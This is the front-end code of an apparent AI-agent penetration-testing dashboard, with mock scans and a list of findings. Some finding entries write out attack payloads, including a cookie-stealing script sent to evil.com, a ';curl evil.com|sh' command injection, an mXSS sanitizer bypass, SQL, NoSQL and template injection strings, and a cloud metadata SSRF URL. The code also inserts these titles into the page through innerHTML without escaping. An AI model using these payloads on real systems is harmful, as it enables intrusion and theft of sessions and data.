/* ========================================
   ConstruData Shield - SPA Dashboard App
   Realistic data based on actual system structure:
   - 13 agents (pre-recon, recon, 5 vuln, 5 exploit, report)
   - session.json format with AgentEndResult
   - Real deliverable file names
   ======================================== */

/* ── Agent Pipeline Definition (matches src/session-manager.ts) ── */
const AGENTS = [
  { id: 'pre-recon', name: 'Pre-Recon', icon: 'fa-magnifying-glass-chart', phase: 'pre-recon' },
  { id: 'recon', name: 'Recon', icon: 'fa-satellite-dish', phase: 'recon' },
  { id: 'injection-vuln', name: 'Injection Analysis', icon: 'fa-database', phase: 'vulnerability-analysis' },
  { id: 'xss-vuln', name: 'XSS Analysis', icon: 'fa-code', phase: 'vulnerability-analysis' },
  { id: 'auth-vuln', name: 'Auth Analysis', icon: 'fa-key', phase: 'vulnerability-analysis' },
  { id: 'ssrf-vuln', name: 'SSRF Analysis', icon: 'fa-globe', phase: 'vulnerability-analysis' },
  { id: 'authz-vuln', name: 'AuthZ Analysis', icon: 'fa-user-lock', phase: 'vulnerability-analysis' },
  { id: 'injection-exploit', name: 'Injection Exploit', icon: 'fa-syringe', phase: 'exploitation' },
  { id: 'xss-exploit', name: 'XSS Exploit', icon: 'fa-bug', phase: 'exploitation' },
  { id: 'auth-exploit', name: 'Auth Exploit', icon: 'fa-unlock', phase: 'exploitation' },
  { id: 'ssrf-exploit', name: 'SSRF Exploit', icon: 'fa-network-wired', phase: 'exploitation' },
  { id: 'authz-exploit', name: 'AuthZ Exploit', icon: 'fa-shield-halved', phase: 'exploitation' },
  { id: 'report', name: 'Report', icon: 'fa-clipboard-check', phase: 'reporting' },
];

/* ── Realistic Data Store (simulates audit-logs/session.json) ── */
const Store = {
  scans: [
    {
      id: 'SC-7f3a1b2c', target: 'staging.lojaexemplo.com.br', type: 'Full Pipeline', status: 'completed', vulns: 41,
      duration: '1h 18m', cost: 52.70, date: '2026-03-06', repo: 'loja-exemplo', workspace: 'audit-mar-2026',
      agents: { 'pre-recon': { success: true, duration_ms: 145200, cost_usd: 3.80 }, 'recon': { success: true, duration_ms: 312400, cost_usd: 5.20 }, 'injection-vuln': { success: true, duration_ms: 198000, cost_usd: 4.10 }, 'xss-vuln': { success: true, duration_ms: 185000, cost_usd: 3.90 }, 'auth-vuln': { success: true, duration_ms: 220000, cost_usd: 4.50 }, 'ssrf-vuln': { success: true, duration_ms: 175000, cost_usd: 3.70 }, 'authz-vuln': { success: true, duration_ms: 195000, cost_usd: 4.00 }, 'injection-exploit': { success: true, duration_ms: 245000, cost_usd: 4.80 }, 'xss-exploit': { success: true, duration_ms: 230000, cost_usd: 4.60 }, 'auth-exploit': { success: true, duration_ms: 260000, cost_usd: 5.10 }, 'ssrf-exploit': { success: false, duration_ms: 180000, cost_usd: 3.50 }, 'authz-exploit': { success: true, duration_ms: 210000, cost_usd: 4.20 }, 'report': { success: true, duration_ms: 125000, cost_usd: 1.30 } }
    },
    {
      id: 'SC-a92e4d1f', target: 'api.gestaoobras.com.br', type: 'API Only', status: 'completed', vulns: 18,
      duration: '47m', cost: 34.80, date: '2026-03-05', repo: 'gestao-obras-api', workspace: null,
      agents: { 'pre-recon': { success: true, duration_ms: 98000, cost_usd: 2.90 }, 'recon': { success: true, duration_ms: 210000, cost_usd: 4.10 }, 'injection-vuln': { success: true, duration_ms: 165000, cost_usd: 3.60 }, 'xss-vuln': { success: true, duration_ms: 145000, cost_usd: 3.20 }, 'auth-vuln': { success: true, duration_ms: 180000, cost_usd: 3.80 }, 'ssrf-vuln': { success: true, duration_ms: 155000, cost_usd: 3.40 }, 'authz-vuln': { success: true, duration_ms: 170000, cost_usd: 3.60 }, 'report': { success: true, duration_ms: 115000, cost_usd: 1.20 } }
    },
    {
      id: 'SC-c5b8e30a', target: 'portal.construtechbr.com', type: 'Full Pipeline', status: 'running', vulns: null,
      duration: '28m', cost: 19.40, date: '2026-03-07', repo: 'construtech-portal', workspace: 'sprint-15-audit',
      agents: { 'pre-recon': { success: true, duration_ms: 132000, cost_usd: 3.50 }, 'recon': { success: true, duration_ms: 290000, cost_usd: 4.90 }, 'injection-vuln': { success: true, duration_ms: 190000, cost_usd: 4.00 }, 'xss-vuln': { success: null, duration_ms: null, cost_usd: null } }
    },
    {
      id: 'SC-d1f7a6b4', target: 'auth.plataformaseg.com', type: 'Auth Focus', status: 'completed', vulns: 9,
      duration: '22m', cost: 18.60, date: '2026-03-04', repo: 'plataforma-seg', workspace: null,
      agents: { 'pre-recon': { success: true, duration_ms: 88000, cost_usd: 2.40 }, 'recon': { success: true, duration_ms: 165000, cost_usd: 3.20 }, 'auth-vuln': { success: true, duration_ms: 240000, cost_usd: 4.80 }, 'auth-exploit': { success: true, duration_ms: 280000, cost_usd: 5.40 }, 'report': { success: true, duration_ms: 105000, cost_usd: 1.10 } }
    },
    {
      id: 'SC-e8c2f519', target: 'erp.construmais.com.br', type: 'Full Pipeline', status: 'failed', vulns: 7,
      duration: '38m', cost: 28.90, date: '2026-03-03', repo: 'construmais-erp', workspace: 'pen-test-q1',
      agents: { 'pre-recon': { success: true, duration_ms: 155000, cost_usd: 3.90 }, 'recon': { success: true, duration_ms: 340000, cost_usd: 5.60 }, 'injection-vuln': { success: true, duration_ms: 205000, cost_usd: 4.20 }, 'xss-vuln': { success: true, duration_ms: 178000, cost_usd: 3.80 }, 'auth-vuln': { success: false, duration_ms: 45000, cost_usd: 1.20, error: 'Target returned 503 during auth testing' }, 'ssrf-vuln': { success: true, duration_ms: 160000, cost_usd: 3.40 }, 'authz-vuln': { success: false, duration_ms: 30000, cost_usd: 0.80, error: 'Connection refused on port 443' } }
    },
    {
      id: 'SC-f4a9d832', target: 'app.imobtech.com', type: 'Full Pipeline', status: 'completed', vulns: 56,
      duration: '1h 42m', cost: 67.30, date: '2026-03-01', repo: 'imobtech-app', workspace: 'assessment-fev',
      agents: { 'pre-recon': { success: true, duration_ms: 198000, cost_usd: 4.60 }, 'recon': { success: true, duration_ms: 420000, cost_usd: 6.80 }, 'injection-vuln': { success: true, duration_ms: 280000, cost_usd: 5.40 }, 'xss-vuln': { success: true, duration_ms: 265000, cost_usd: 5.10 }, 'auth-vuln': { success: true, duration_ms: 310000, cost_usd: 5.80 }, 'ssrf-vuln': { success: true, duration_ms: 240000, cost_usd: 4.80 }, 'authz-vuln': { success: true, duration_ms: 255000, cost_usd: 5.00 }, 'injection-exploit': { success: true, duration_ms: 320000, cost_usd: 6.20 }, 'xss-exploit': { success: true, duration_ms: 290000, cost_usd: 5.60 }, 'auth-exploit': { success: true, duration_ms: 340000, cost_usd: 6.40 }, 'ssrf-exploit': { success: true, duration_ms: 270000, cost_usd: 5.30 }, 'authz-exploit': { success: true, duration_ms: 285000, cost_usd: 5.50 }, 'report': { success: true, duration_ms: 145000, cost_usd: 1.80 } }
    },
    {
      id: 'SC-1b2e8c4a', target: 'painel.engecorp.com.br', type: 'Recon Only', status: 'completed', vulns: 0,
      duration: '14m', cost: 8.20, date: '2026-02-27', repo: 'engecorp-painel', workspace: null,
      agents: { 'pre-recon': { success: true, duration_ms: 110000, cost_usd: 3.10 }, 'recon': { success: true, duration_ms: 250000, cost_usd: 5.10 } }
    },
  ],

  vulns: [
    // SC-7f3a1b2c (loja-exemplo) - 41 vulns total, showing key ones
    { id: 'V-001', title: 'SQL Injection via search parameter: /api/produtos?q=\' OR 1=1--', severity: 'critical', category: 'Injection', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/produtos?q=', evidence: 'Time-based blind SQLi confirmed, 5s delay on sleep(5)' },
    { id: 'V-002', title: 'Stored XSS in product review field (bypasses DOMPurify via mXSS)', severity: 'critical', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'POST /api/reviews', evidence: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>' },
    { id: 'V-003', title: 'JWT secret is "secret123" - brute-forced in <1 second', severity: 'critical', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: 'jwt-cracker found secret in 0.3s, forged admin token' },
    { id: 'V-004', title: 'IDOR: /api/pedidos/:id returns any users order data', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/pedidos/1337', evidence: 'User A can access User B orders by incrementing ID' },
    { id: 'V-005', title: 'SSRF via image URL in /api/produtos/import allows internal network scanning', severity: 'high', category: 'SSRF', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'ssrf-vuln', endpoint: 'POST /api/produtos/import', evidence: 'Successfully accessed http://169.254.169.254/latest/meta-data/' },
    { id: 'V-006', title: 'Mass assignment: POST /api/users accepts role field, escalation to admin', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-exploit', endpoint: 'POST /api/users', evidence: '{"email":"test@x.com","role":"admin"} created admin account' },
    { id: 'V-007', title: 'Reflected XSS in /busca?q= parameter (no output encoding)', severity: 'high', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'GET /busca?q=', evidence: '/busca?q=<script>fetch("https://evil.com/"+document.cookie)</script>' },
    { id: 'V-008', title: 'Missing rate limit on /api/auth/login (brute force possible)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: '1000 requests in 10 seconds without blocking' },
    { id: 'V-009', title: 'CORS allows any origin with credentials', severity: 'medium', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true' },
    { id: 'V-010', title: 'Password reset token is sequential (guessable)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-exploit', endpoint: 'POST /api/auth/reset', evidence: 'Tokens are base64(user_id + timestamp), predictable' },
    { id: 'V-011', title: 'Express stack traces exposed in production errors', severity: 'low', category: 'Information Disclosure', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: 'GET /api/undefined', evidence: 'Full stack trace with file paths and dependency versions' },
    { id: 'V-012', title: 'Missing HSTS header on all responses', severity: 'low', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Strict-Transport-Security header not present' },
    { id: 'V-013', title: 'Session cookies missing HttpOnly flag', severity: 'low', category: 'Session', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'fixed', agent: 'auth-vuln', endpoint: '*', evidence: 'Set-Cookie: session=... (no HttpOnly)' },
    // SC-a92e4d1f (gestao-obras-api)
    { id: 'V-014', title: 'NoSQL Injection in /api/obras?filter={$gt:""}', severity: 'critical', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/obras?filter=', evidence: 'MongoDB operator injection returns all documents' },
    { id: 'V-015', title: 'API key transmitted in URL query parameter', severity: 'high', category: 'Authentication', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'auth-vuln', endpoint: 'GET /api/*?api_key=', evidence: 'API key visible in server access logs and browser history' },
    { id: 'V-016', title: 'Broken function level authorization on /api/admin/* endpoints', severity: 'high', category: 'Authorization', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/admin/users', evidence: 'Regular user token accepted on admin endpoints' },
    { id: 'V-017', title: 'Unrestricted file upload accepts .php files', severity: 'high', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/documentos/upload', evidence: 'Uploaded shell.php.jpg, accessible at /uploads/shell.php.jpg' },
    // SC-d1f7a6b4 (plataforma-seg)
    { id: 'V-018', title: 'OAuth2 state parameter not validated (CSRF on login)', severity: 'critical', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /oauth/callback', evidence: 'Replayed callback URL without state param, session hijacked' },
    { id: 'V-019', title: 'Refresh token never expires and can be reused after revocation', severity: 'high', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-exploit', endpoint: 'POST /oauth/token', evidence: 'Revoked refresh token still produces new access tokens' },
    { id: 'V-020', title: 'Open redirect in /auth/callback?redirect_uri=', severity: 'medium', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /auth/callback', evidence: 'redirect_uri=https://evil.com accepted without validation' },
    // SC-f4a9d832 (imobtech-app)
    { id: 'V-021', title: 'Command injection in PDF export via filename: ;curl evil.com|sh', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-exploit', endpoint: 'POST /api/relatorios/pdf', evidence: 'Filename passed unsanitized to wkhtmltopdf shell command' },
    { id: 'V-022', title: 'SSTI in email template engine: {{constructor.constructor("return this")()}}', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/notificacoes/email', evidence: 'Nunjucks template injection confirmed, RCE achieved' },
    { id: 'V-023', title: 'GraphQL introspection enabled, exposes entire schema', severity: 'medium', category: 'Information Disclosure', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'recon', endpoint: 'POST /graphql', evidence: '__schema { types { name fields { name } } } returns full schema' },
    { id: 'V-024', title: 'Privilege escalation via GraphQL mutation: updateUser(role: ADMIN)', severity: 'high', category: 'Authorization', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'authz-exploit', endpoint: 'POST /graphql', evidence: 'mutation { updateUser(id: "me", role: ADMIN) { role } } succeeds' },
  ],

  reports: [
    { id: 'R-7f3a1b2c', title: 'staging.lojaexemplo.com.br - Full Security Assessment', scan: 'SC-7f3a1b2c', date: '2026-03-06', vulns: 41, critical: 3, pages: 67, deliverable: 'comprehensive_security_assessment_report.md' },
    { id: 'R-a92e4d1f', title: 'api.gestaoobras.com.br - API Security Report', scan: 'SC-a92e4d1f', date: '2026-03-05', vulns: 18, critical: 1, pages: 34, deliverable: 'comprehensive_security_assessment_report.md' },
    { id: 'R-d1f7a6b4', title: 'auth.plataformaseg.com - Auth Focus Report', scan: 'SC-d1f7a6b4', date: '2026-03-04', vulns: 9, critical: 1, pages: 22, deliverable: 'comprehensive_security_assessment_report.md' },
    { id: 'R-f4a9d832', title: 'app.imobtech.com - Full Security Assessment', scan: 'SC-f4a9d832', date: '2026-03-01', vulns: 56, critical: 2, pages: 89, deliverable: 'comprehensive_security_assessment_report.md' },
  ],

  getStats() {
    const c = this.vulns.filter(v => v.severity === 'critical').length;
    const h = this.vulns.filter(v => v.severity === 'high').length;
    const m = this.vulns.filter(v => v.severity === 'medium').length;
    const l = this.vulns.filter(v => v.severity === 'low').length;
    return { scans: this.scans.length, vulns: this.vulns.length, critical: c, high: h, medium: m, low: l };
  },

  addScan(scan) {
    const hex = Math.random().toString(16).slice(2, 10);
    const id = `SC-${hex}`;
    this.scans.unshift({ id, ...scan, status: 'running', vulns: null, cost: 0, date: new Date().toISOString().slice(0, 10), agents: {} });
    return id;
  }
};

/* ── Chart tokens ── */
const YELLOW = '#FFEF4D';
const NAVY_LIGHT = '#334d9e';
const TEXT_MUTED = '#5c6a94';
Chart.defaults.font.family = "'Inter', sans-serif";
Chart.defaults.color = TEXT_MUTED;

/* ========================================
   ROUTER
   ======================================== */
const PAGE_NAMES = {
  dashboard: 'Overview', scans: 'Security Scans', vulnerabilities: 'Vulnerabilities',
  reports: 'Reports', analytics: 'Analytics', alerts: 'Alerts',
  applications: 'Applications', endpoints: 'API Endpoints',
  settings: 'System Settings', help: 'Help Center', tutorial: 'Tutorial',
};

function getPageFromHash() {
  return (window.location.hash.slice(1) || 'dashboard').split('/')[0];
}

function navigate(page) {
  document.querySelectorAll('.nav-item').forEach(item => {
    item.classList.toggle('active', item.dataset.page === page);
  });
  document.getElementById('breadcrumb').innerHTML = `<span>Dashboard</span><i class="fas fa-chevron-right"></i><span class="breadcrumb-active">${PAGE_NAMES[page] || page}</span>`;

  const container = document.getElementById('page-container');
  const tplMap = { dashboard:'tpl-dashboard', scans:'tpl-scans', vulnerabilities:'tpl-vulnerabilities', reports:'tpl-reports', help:'tpl-help', tutorial:'tpl-tutorial' };
  const template = document.getElementById(tplMap[page] || '');

  if (template) {
    container.innerHTML = '';
    container.appendChild(template.content.cloneNode(true));
    initPage(page);
  } else {
    const g = document.getElementById('tpl-generic');
    container.innerHTML = '';
    container.appendChild(g.content.cloneNode(true));
    document.getElementById('generic-title').textContent = PAGE_NAMES[page] || page;
  }
}

function initPage(page) {
  const init = { dashboard: initDashboard, scans: initScans, vulnerabilities: initVulnerabilities, reports: initReports, tutorial: initTutorial };
  if (init[page]) init[page]();
}

/* ========================================
   DASHBOARD
   ======================================== */
function initDashboard() {
  const stats = Store.getStats();
  animateCounter(document.getElementById('stat-scans'), stats.scans);
  animateCounter(document.getElementById('stat-vulns'), stats.vulns);
  animateCounter(document.getElementById('stat-critical'), stats.critical);
  renderScansTable('dashboard-scans-table', Store.scans.slice(0, 5));
  initVulnTrendChart();
  initSeverityChart();
}

function animateCounter(el, target) {
  if (!el) return;
  let c = 0;
  const step = Math.max(1, Math.ceil(target / 30));
  const t = setInterval(() => { c = Math.min(c + step, target); el.textContent = c.toLocaleString(); if (c >= target) clearInterval(t); }, 20);
}

function initVulnTrendChart() {
  const canvas = document.getElementById('vulnTrendChart');
  if (!canvas) return;
  new Chart(canvas.getContext('2d'), {
    type: 'bar',
    data: { labels: ['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC'],
      datasets: [
        { label: 'New', data: [18,24,41,0,0,0,0,0,0,0,0,0], backgroundColor: YELLOW, borderRadius: 3, borderSkipped: false, barPercentage: 0.7, categoryPercentage: 0.7 },
        { label: 'Resolved', data: [5,8,3,0,0,0,0,0,0,0,0,0], backgroundColor: NAVY_LIGHT, borderRadius: 3, borderSkipped: false, barPercentage: 0.7, categoryPercentage: 0.7 },
      ] },
    options: { responsive: true, maintainAspectRatio: false, interaction: { mode: 'index', intersect: false },
      plugins: { legend: { display: false }, tooltip: { backgroundColor: '#172560', borderColor: 'rgba(255,239,77,0.15)', borderWidth: 1, padding: 12, cornerRadius: 8 } },
      scales: { x: { grid: { display: false }, border: { display: false }, ticks: { font: { size: 11, weight: '600' } } },
        y: { grid: { color: 'rgba(255,239,77,0.06)' }, border: { display: false }, beginAtZero: true } } },
  });
}

function initSeverityChart() {
  const canvas = document.getElementById('severityChart');
  if (!canvas) return;
  const stats = Store.getStats();
  new Chart(canvas.getContext('2d'), {
    type: 'doughnut',
    data: { labels: ['Critical','High','Medium','Low'],
      datasets: [{ data: [stats.critical, stats.high, stats.medium, stats.low], backgroundColor: ['#ef4444','#f97316','#FFEF4D','#60a5fa'], borderColor: '#14204e', borderWidth: 3, hoverOffset: 6 }] },
    options: { responsive: true, maintainAspectRatio: false, cutout: '68%',
      plugins: { legend: { display: false }, tooltip: { backgroundColor: '#172560', borderColor: 'rgba(255,239,77,0.15)', borderWidth: 1, padding: 12, cornerRadius: 8 } } },
  });
}

/* ========================================
   SCANS TABLE (shared)
   ======================================== */
function renderScansTable(containerId, scans) {
  const c = document.getElementById(containerId);
  if (!c) return;
  const sc = s => s === 'completed' ? 'success' : s === 'running' ? 'running' : 'failed';
  c.innerHTML = `<table><thead><tr><th>ID</th><th>TARGET</th><th>TYPE</th><th>STATUS</th><th>VULNS</th><th>DURATION</th><th>COST</th></tr></thead><tbody>${scans.map(s =>
    `<tr><td class="id-cell">#${s.id}</td><td>${s.target}</td><td>${s.type}</td><td><span class="status-badge ${sc(s.status)}">${s.status.charAt(0).toUpperCase()+s.status.slice(1)}</span></td><td>${s.vulns !== null ? s.vulns : '--'}</td><td>${s.duration}</td><td>$${s.cost.toFixed(2)}</td></tr>`
  ).join('')}</tbody></table>`;
}

/* ========================================
   SCANS PAGE
   ======================================== */
function initScans() {
  renderScansTable('scans-table', Store.scans);
  const form = document.getElementById('new-scan-form');
  const btnNew = document.getElementById('btn-new-scan');
  const btnClose = document.getElementById('btn-close-form');
  const btnCancel = document.getElementById('btn-cancel-scan');
  const btnLaunch = document.getElementById('btn-launch-scan');

  btnNew.addEventListener('click', () => { form.style.display = 'block'; form.scrollIntoView({ behavior: 'smooth' }); btnNew.style.display = 'none'; });
  const closeForm = () => { form.style.display = 'none'; btnNew.style.display = ''; };
  btnClose.addEventListener('click', closeForm);
  btnCancel.addEventListener('click', closeForm);

  const urlInput = document.getElementById('scan-url');
  const repoInput = document.getElementById('scan-repo');
  const typeInput = document.getElementById('scan-type');
  const wsInput = document.getElementById('scan-workspace');

  function updateCli() {
    const url = urlInput.value || 'https://...';
    const repo = repoInput.value || '...';
    let cmd = `./shield start URL=${url} REPO=${repo}`;
    if (document.getElementById('auth-type').value) cmd += ` CONFIG=./configs/${repo}.yaml`;
    if (wsInput.value) cmd += ` WORKSPACE=${wsInput.value}`;
    document.getElementById('cli-command').textContent = cmd;
  }

  [urlInput, repoInput, typeInput, wsInput, document.getElementById('auth-type')].forEach(el => {
    el.addEventListener('input', updateCli);
    el.addEventListener('change', updateCli);
  });

  btnLaunch.addEventListener('click', () => {
    const url = urlInput.value.trim();
    const repo = repoInput.value.trim();
    if (!url || !repo) { alert('Target URL and Repository Name are required.'); return; }
    showAuthorizationModal(url, () => {
      const scanId = Store.addScan({ target: (() => { try { return new URL(url).hostname; } catch { return url; } })(), type: typeInput.options[typeInput.selectedIndex].text.split(' (')[0], duration: '0m', repo });
      closeForm();
      renderScansTable('scans-table', Store.scans);
      showToast(`Scan ${scanId} created! Run the CLI command on your server to execute.`);
    });
  });

  document.getElementById('scan-search').addEventListener('input', e => {
    const q = e.target.value.toLowerCase();
    renderScansTable('scans-table', Store.scans.filter(s => s.target.includes(q) || s.id.toLowerCase().includes(q) || s.type.toLowerCase().includes(q)));
  });
}

/* ========================================
   VULNERABILITIES PAGE
   ======================================== */
function initVulnerabilities() {
  const stats = Store.getStats();
  // Update filter counts
  document.querySelectorAll('.filter-btn').forEach(btn => {
    const f = btn.dataset.filter;
    const count = btn.querySelector('.filter-count');
    if (count) count.textContent = f === 'all' ? stats.vulns : stats[f] || 0;
  });

  function renderVulns(filter) {
    const list = document.getElementById('vuln-list');
    const filtered = filter === 'all' ? Store.vulns : Store.vulns.filter(v => v.severity === filter);
    list.innerHTML = filtered.length ? filtered.map(v =>
      `<div class="vuln-item ${v.severity}"><div class="vuln-severity ${v.severity}">${v.severity}</div><div class="vuln-info"><div class="vuln-title">${v.title}</div><div class="vuln-meta">${v.category} &middot; ${v.id} &middot; Scan #${v.scan} &middot; Agent: ${v.agent || 'n/a'} &middot; <span class="status-badge ${v.status==='open'?'failed':'success'}">${v.status}</span></div></div><div class="vuln-target">${v.target}</div></div>`
    ).join('') : '<div class="empty-state"><div class="empty-state-icon"><i class="fas fa-check-circle"></i></div><h2 class="empty-state-title">No vulnerabilities</h2><p class="empty-state-text">No findings match this filter.</p></div>';
  }

  renderVulns('all');
  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      renderVulns(btn.dataset.filter);
    });
  });
}

/* ========================================
   REPORTS PAGE
   ======================================== */
function initReports() {
  document.getElementById('reports-grid').innerHTML = Store.reports.map(r =>
    `<div class="report-card"><div class="report-card-header"><div class="report-icon"><i class="fas fa-file-shield"></i></div><div><div class="report-title">${r.title}</div><div class="report-date">${r.date} &middot; Scan #${r.scan}</div></div></div><div class="report-stats"><div class="report-stat"><strong>${r.vulns}</strong> vulnerabilities</div><div class="report-stat"><strong>${r.critical}</strong> critical</div><div class="report-stat"><strong>${r.pages}</strong> pages</div></div><div class="report-footer"><span class="status-badge success">Complete</span><button class="btn-outline" style="font-size:11px;padding:5px 12px"><i class="fas fa-download"></i> ${r.deliverable.replace('.md','')}</button></div></div>`
  ).join('');
}

/* ========================================
   TUTORIAL PAGE
   ======================================== */
function initTutorial() {
  const TOTAL_STEPS = 6;
  let currentStep = 1;
  let completedSteps = new Set();

  function activateStep(n) {
    currentStep = n;
    document.querySelectorAll('.tutorial-step').forEach(step => {
      const sn = parseInt(step.dataset.step);
      step.classList.remove('active', 'locked', 'completed');
      if (sn === n) step.classList.add('active');
      else if (completedSteps.has(sn)) step.classList.add('completed');
      else if (sn > n) step.classList.add('locked');
    });
    updateProgress();
    updateStepIcons();
  }

  function completeStep(n) {
    completedSteps.add(n);
    const statusEl = document.getElementById(`step-status-${n}`);
    if (statusEl) statusEl.innerHTML = '<i class="fas fa-check-circle"></i>';
  }

  function updateProgress() {
    const pct = (completedSteps.size / TOTAL_STEPS) * 100;
    const fill = document.getElementById('tutorial-progress-fill');
    const text = document.getElementById('tutorial-progress-text');
    if (fill) fill.style.width = `${pct}%`;
    if (text) text.textContent = `${completedSteps.size} / ${TOTAL_STEPS}`;
  }

  function updateStepIcons() {
    for (let i = 1; i <= TOTAL_STEPS; i++) {
      const el = document.getElementById(`step-status-${i}`);
      if (!el) continue;
      if (completedSteps.has(i)) el.innerHTML = '<i class="fas fa-check-circle"></i>';
      else if (i === currentStep) el.innerHTML = '<i class="fas fa-circle-play"></i>';
      else el.innerHTML = '<i class="fas fa-lock"></i>';
    }
  }

  // Next buttons
  document.querySelectorAll('.tutorial-next-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const nextStep = parseInt(btn.dataset.next);
      completeStep(nextStep - 1);
      activateStep(nextStep);
    });
  });

  // Step headers clickable (to revisit completed steps)
  document.querySelectorAll('.tutorial-step-header').forEach(header => {
    header.addEventListener('click', () => {
      const step = parseInt(header.closest('.tutorial-step').dataset.step);
      if (completedSteps.has(step) || step === currentStep) {
        activateStep(step);
      }
    });
  });

  // Step 2: Checklist enables next button
  document.querySelectorAll('.tutorial-checkbox').forEach(chk => {
    chk.addEventListener('change', () => {
      const allChecked = [...document.querySelectorAll('.tutorial-checkbox')].every(c => c.checked);
      const nextBtn = document.querySelector('.tutorial-step[data-step="2"] .tutorial-next-btn');
      if (nextBtn) nextBtn.disabled = !allChecked;
    });
  });

  // Step 3: CLI generator
  const tutUrl = document.getElementById('tut-url');
  const tutRepo = document.getElementById('tut-repo');
  if (tutUrl && tutRepo) {
    function tutUpdateCli() {
      const url = tutUrl.value.trim();
      const repo = tutRepo.value.trim();
      const preview = document.getElementById('tut-cli-preview');
      const cmd = document.getElementById('tut-cli-cmd');
      const nextBtn = document.querySelector('.tutorial-step[data-step="3"] .tutorial-next-btn');
      if (url && repo) {
        preview.style.display = '';
        cmd.textContent = `./shield start URL=${url} REPO=${repo}`;
        if (nextBtn) nextBtn.disabled = false;
      } else {
        preview.style.display = 'none';
        if (nextBtn) nextBtn.disabled = true;
      }
    }
    tutUrl.addEventListener('input', tutUpdateCli);
    tutRepo.addEventListener('input', tutUpdateCli);
  }

  // Step 4: Terminal simulation
  const runBtn = document.getElementById('tut-run-btn');
  if (runBtn) {
    runBtn.addEventListener('click', () => {
      runBtn.disabled = true;
      runBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Running...';
      const terminal = document.getElementById('terminal-sim');
      const lines = [
        { text: '[Shield] Starting Docker containers...', delay: 400 },
        { text: '[Shield] Temporal workflow initialized', delay: 800 },
        { text: '[Shield] Session ID: SC-' + Math.random().toString(16).slice(2,10), delay: 200 },
        { text: '[Agent] pre-recon starting... analyzing source code', delay: 600, cls: 'terminal-output' },
        { text: '[Agent] pre-recon completed (2m 25s, $3.80)', delay: 1200, cls: 'terminal-success' },
        { text: '[Agent] recon starting... mapping web application', delay: 400, cls: 'terminal-output' },
        { text: '[Agent] recon completed (5m 12s, $5.20)', delay: 1500, cls: 'terminal-success' },
        { text: '[Agent] Starting vulnerability-analysis phase (5 agents in parallel)...', delay: 400, cls: 'terminal-output' },
        { text: '[Agent] injection-vuln completed (3m 18s, $4.10)', delay: 800, cls: 'terminal-success' },
        { text: '[Agent] xss-vuln completed (3m 05s, $3.90)', delay: 600, cls: 'terminal-success' },
        { text: '[Agent] auth-vuln completed (3m 40s, $4.50)', delay: 700, cls: 'terminal-success' },
        { text: '[Shield] Pipeline running... check dashboard for live results', delay: 500, cls: 'terminal-success' },
      ];
      let totalDelay = 0;
      lines.forEach(line => {
        totalDelay += line.delay;
        setTimeout(() => {
          const div = document.createElement('div');
          div.className = `terminal-line ${line.cls || ''}`;
          div.textContent = line.text;
          terminal.appendChild(div);
          terminal.scrollTop = terminal.scrollHeight;
        }, totalDelay);
      });
      setTimeout(() => {
        const nextBtn = document.querySelector('.tutorial-step[data-step="4"] .tutorial-next-btn');
        if (nextBtn) nextBtn.disabled = false;
        runBtn.innerHTML = '<i class="fas fa-check"></i> Completed';
      }, totalDelay + 400);
    });
  }

  // Step 5: Render agents grid
